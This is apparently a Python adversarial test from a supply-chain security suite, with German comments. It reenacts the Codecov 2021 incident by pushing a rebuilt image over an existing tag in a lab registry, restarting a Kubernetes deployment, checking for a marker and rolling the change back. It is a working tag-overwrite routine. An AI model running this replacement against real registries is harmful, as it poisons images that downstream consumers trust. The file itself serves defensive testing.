"""Adversarialer Test: Codecov (2021) — Image unter bestehendem Tag ersetzen."""

import hashlib
import json
import pathlib
import tarfile
import tempfile
import uuid

import lib

MANIFEST_ACCEPT = ", ".join((
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.oci.image.index.v1+json",
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
))
DOCKER_MANIFEST = "application/vnd.docker.distribution.manifest.v2+json"
DOCKER_CONFIG = "application/vnd.docker.container.image.v1+json"
DOCKER_LAYER = "application/vnd.docker.image.rootfs.diff.tar"


class CodecovTagOverwrite(lib.AttackTest):
    META = {
        "id": "codecov-tag-overwrite",
        "title": "Codecov — Image unter bestehendem Tag ersetzt",
        "vg": "VG5 (Distributor -> Consumer)",
        "capec": "CAPEC-560, CAPEC-439",
        "stride": "Tampering",
        "assumption": "A5",
        "incident": "Codecov, 2021",
    }

    def attack(self) -> None:
        """Überschreibt den Registry-Tag und startet den unveränderten Consumer neu."""
        self._deployment_image = self.deployed_image()
        self._repo = self.cfg["registry_repo"]
        self._tag = self.cfg["registry_tag"]
        self._nonce = uuid.uuid4().hex[:12]
        self._original_digest = ""

        with lib.registry_api(self.cfg) as registry:
            self._original_digest = self._manifest_digest(registry, self._tag)
            self._build_and_push(registry)
            tag_digest = self._manifest_digest(registry, self._tag)
            if tag_digest != self._attack_digest:
                raise RuntimeError(
                    f"Registry-Tag zeigt auf {tag_digest}, erwartet wurde {self._attack_digest}"
                )

        self._assert_deployment_unchanged()
        lib.run(lib.kubectl(
            self.cfg, "rollout", "restart", f"deployment/{self.cfg['deployment']}",
            "-n", self.cfg["deploy_ns"],
        ))
        lib.run(lib.kubectl(
            self.cfg, "rollout", "status", f"deployment/{self.cfg['deployment']}",
            "-n", self.cfg["deploy_ns"], "--timeout=180s",
        ))
        self.detail = (
            f"Tag {self._repo}:{self._tag} auf {self._attack_digest} gesetzt; "
            f"Deployment-Referenz unverändert ({self._deployment_image})"
        )

    def probe(self) -> bool:
        """Prüft Marker-Nonce, Registry-Tag und die Image-ID des laufenden Pods."""
        self._assert_deployment_unchanged()
        with lib.registry_api(self.cfg) as registry:
            tag_digest = self._manifest_digest(registry, self._tag)
        pod_image_id = self._running_pod_image_id()
        pod_digest = self._digest_from_reference(pod_image_id)

        with self.deployed() as url:
            status, body = lib.http_get(url + "/codecov-marker")

        marker = f"CODECOV-TAG-OVERWRITE:{self._nonce}"
        reachable = (
            status == 200
            and marker in body
            and tag_digest == self._attack_digest
        )
        pod_detail = pod_digest or pod_image_id or "nicht verfügbar"
        if reachable:
            self.detail = (
                f"Nonce-Marker bestätigt; Tag-Digest {tag_digest}, "
                f"Pod-Image-Digest {pod_detail}"
            )
        else:
            self.detail = (
                f"Nonce-Marker nicht bestätigt (HTTP {status}); Tag-Digest {tag_digest}, "
                f"Pod-Image-Digest {pod_detail}; erwartet für den Angriff "
                f"{self._attack_digest}, festgelegter Digest "
                f"{self._digest_from_reference(self._deployment_image) or 'Tag-Referenz'}"
            )
        return reachable

    def cleanup(self) -> None:
        """Setzt den Registry-Tag und den Consumer auf den Ausgangszustand zurück."""
        original_digest = getattr(self, "_original_digest", "")
        should_restart = False
        try:
            if original_digest:
                with lib.registry_api(self.cfg) as registry:
                    current_digest = self._manifest_digest(registry, self._tag)
                    if current_digest != original_digest:
                        body, media_type = self._manifest_by_digest(
                            registry, original_digest
                        )
                        status, headers, response = registry.request(
                            "PUT",
                            self._manifest_path(self._tag),
                            headers={"Content-Type": media_type},
                            body=body,
                        )
                        if status != 201:
                            raise RuntimeError(
                                f"Wiederherstellung des Tags lieferte HTTP {status}: "
                                f"{response[:200]!r}"
                            )
                        returned_digest = self._header(headers, "Docker-Content-Digest")
                        if returned_digest and returned_digest != original_digest:
                            raise RuntimeError(
                                f"Registry bestätigte Wiederherstellung mit "
                                f"unerwartetem Digest {returned_digest}"
                            )
                        should_restart = True
                    if self._manifest_digest(registry, self._tag) != original_digest:
                        raise RuntimeError("Registry-Tag zeigt nach Cleanup nicht auf das Original")

            deployment_image = getattr(self, "_deployment_image", None)
            if deployment_image:
                self._assert_deployment_unchanged()
            if getattr(self, "_attack_digest", None):
                should_restart = True
            if should_restart:
                lib.run(lib.kubectl(
                    self.cfg, "rollout", "restart",
                    f"deployment/{self.cfg['deployment']}", "-n", self.cfg["deploy_ns"],
                ))
                lib.run(lib.kubectl(
                    self.cfg, "rollout", "status",
                    f"deployment/{self.cfg['deployment']}", "-n", self.cfg["deploy_ns"],
                    "--timeout=180s",
                ))
            if original_digest:
                print(f"    -> Registry-Tag auf {original_digest} zurückgesetzt")
        finally:
            local_image = getattr(self, "_local_image", None)
            if local_image:
                lib.run(["docker", "image", "rm", local_image], check=False)
            self._rmtmp()

    def _build_and_push(self, registry: lib.RegistryAPI) -> None:
        """Baut ein passendes Image und veröffentlicht seine OCI-Inhalte per API."""
        architecture = self._node_architecture()
        payload = lib.REPO_ROOT / "Adversarial" / "payloads" / "codecov-tag-overwrite"
        tmp = tempfile.mkdtemp(prefix="adv-codecov-tag-")
        self._tmpdirs.append(tmp)
        archive_path = pathlib.Path(tmp) / "image.tar"
        self._local_image = f"codecov-tag-overwrite:{self._nonce}"

        # Die Registry hat hier keine Authentifizierung; der Zugriff bildet den
        # durch CAPEC-560 erlangten Schreibzugang des Angreifers ab.
        lib.run([
            "docker", "buildx", "build",
            "--platform", f"linux/{architecture}",
            "--provenance=false", "--sbom=false", "--load",
            "--build-arg", f"CODECOV_NONCE={self._nonce}",
            "-t", self._local_image,
            str(payload),
        ])
        lib.run(["docker", "save", "--output", str(archive_path), self._local_image])

        with tarfile.open(archive_path, mode="r:") as archive:
            manifest_file = archive.extractfile("manifest.json")
            if manifest_file is None:
                raise RuntimeError("Docker-Export enthält keine manifest.json")
            entries = json.loads(manifest_file.read())
            if not entries:
                raise RuntimeError("Docker-Export enthält kein Image-Manifest")
            entry = next((
                candidate for candidate in entries
                if self._local_image in (candidate.get("RepoTags") or [])
            ), entries[0])
            config_content = self._archive_file(archive, entry["Config"])
            config = json.loads(config_content)
            if config.get("architecture") != architecture:
                raise RuntimeError(
                    f"Gebautes Image hat Architektur {config.get('architecture')}, "
                    f"erwartet wurde {architecture}"
                )
            config_digest = registry.upload_blob(self._repo, config_content)
            layers = []
            for layer_name in entry.get("Layers", []):
                layer_content = self._archive_file(archive, layer_name)
                layers.append({
                    "mediaType": DOCKER_LAYER,
                    "size": len(layer_content),
                    "digest": registry.upload_blob(self._repo, layer_content),
                })

        image_manifest = {
            "schemaVersion": 2,
            "mediaType": DOCKER_MANIFEST,
            "config": {
                "mediaType": DOCKER_CONFIG,
                "size": len(config_content),
                "digest": config_digest,
            },
            "layers": layers,
        }
        manifest_content = json.dumps(
            image_manifest, separators=(",", ":")
        ).encode()
        status, headers, response = registry.request(
            "PUT",
            self._manifest_path(self._tag),
            headers={"Content-Type": DOCKER_MANIFEST},
            body=manifest_content,
        )
        if status != 201:
            raise RuntimeError(
                f"Veröffentlichung des Image-Manifests lieferte HTTP {status}: "
                f"{response[:300]!r}"
            )
        self._attack_digest = self._header(headers, "Docker-Content-Digest")
        if not self._attack_digest:
            self._attack_digest = f"sha256:{hashlib.sha256(manifest_content).hexdigest()}"

    @staticmethod
    def _archive_file(archive: tarfile.TarFile, name: str) -> bytes:
        """Liest eine Datei aus dem Docker-Export-Archiv."""
        member = archive.extractfile(name)
        if member is None:
            raise RuntimeError(f"Docker-Export enthält die Datei {name!r} nicht")
        return member.read()

    def _node_architecture(self) -> str:
        """Liefert die einheitliche Architektur der Kubernetes-Nodes."""
        value = lib.run(lib.kubectl(
            self.cfg, "get", "nodes",
            "-o", "jsonpath={range .items[*]}{.status.nodeInfo.architecture}{'\\n'}{end}",
        )).stdout
        architectures = set(value.split())
        if not architectures:
            raise RuntimeError("Keine Node-Architektur im Cluster gefunden")
        if len(architectures) != 1:
            raise RuntimeError(
                f"Mehrere Node-Architekturen werden nicht unterstützt: "
                f"{', '.join(sorted(architectures))}"
            )
        return architectures.pop()

    def _manifest_digest(self, registry: lib.RegistryAPI, reference: str) -> str:
        """Ermittelt den Digest eines Tags oder Manifests über die Registry-API."""
        status, headers, body = registry.request(
            "HEAD", self._manifest_path(reference),
            headers={"Accept": MANIFEST_ACCEPT},
        )
        if status != 200:
            raise RuntimeError(
                f"HEAD auf Registry-Manifest {self._repo}:{reference} "
                f"lieferte HTTP {status}: {body[:200]!r}"
            )
        digest = self._header(headers, "Docker-Content-Digest")
        if not digest:
            raise RuntimeError("Registry-Antwort enthält keinen Docker-Content-Digest")
        return digest

    def _manifest_by_digest(
        self, registry: lib.RegistryAPI, digest: str,
    ) -> tuple[bytes, str]:
        """Liest das Original-Manifest für den Rollback anhand seines Digests."""
        status, headers, body = registry.request(
            "GET", self._manifest_path(digest),
            headers={"Accept": MANIFEST_ACCEPT},
        )
        if status != 200:
            raise RuntimeError(
                f"GET des Original-Manifests {digest} lieferte HTTP {status}"
            )
        content_type = self._header(headers, "Content-Type")
        if not content_type:
            raise RuntimeError(f"Registry lieferte für {digest} keinen Content-Type")
        calculated = f"sha256:{hashlib.sha256(body).hexdigest()}"
        if calculated != digest:
            raise RuntimeError(
                f"Original-Manifest hat Digest {calculated}, erwartet wurde {digest}"
            )
        return body, content_type

    def _manifest_path(self, reference: str) -> str:
        return f"/v2/{self._repo}/manifests/{reference}"

    def _assert_deployment_unchanged(self) -> None:
        current = self.deployed_image()
        if current != self._deployment_image:
            raise RuntimeError(
                f"Deployment-Referenz wurde verändert: "
                f"{self._deployment_image} -> {current}"
            )

    def _running_pod_image_id(self) -> str:
        """Liefert die Image-ID des bereiten Demo-App-Pods."""
        raw = lib.run(lib.kubectl(
            self.cfg, "get", "pods", "-n", self.cfg["deploy_ns"],
            "-l", "app=demo-app", "-o", "json",
        )).stdout
        document = json.loads(raw)
        pods = sorted(
            document.get("items", []),
            key=lambda pod: pod.get("metadata", {}).get("creationTimestamp", ""),
            reverse=True,
        )
        for pod in pods:
            if pod.get("metadata", {}).get("deletionTimestamp"):
                continue
            if pod.get("status", {}).get("phase") != "Running":
                continue
            conditions = pod.get("status", {}).get("conditions", [])
            ready = any(
                condition.get("type") == "Ready" and condition.get("status") == "True"
                for condition in conditions
            )
            if not ready:
                continue
            for status in pod.get("status", {}).get("containerStatuses", []):
                if status.get("name") == "demo-app":
                    return status.get("imageID", "")
        return ""

    @staticmethod
    def _digest_from_reference(reference: str) -> str:
        marker = "@sha256:"
        if marker in reference:
            return "sha256:" + reference.rsplit(marker, 1)[1]
        marker = "sha256:"
        if marker in reference:
            return marker + reference.rsplit(marker, 1)[1]
        return ""

    @staticmethod
    def _header(headers: dict[str, str], name: str) -> str:
        return next((
            value for key, value in headers.items() if key.lower() == name.lower()
        ), "")
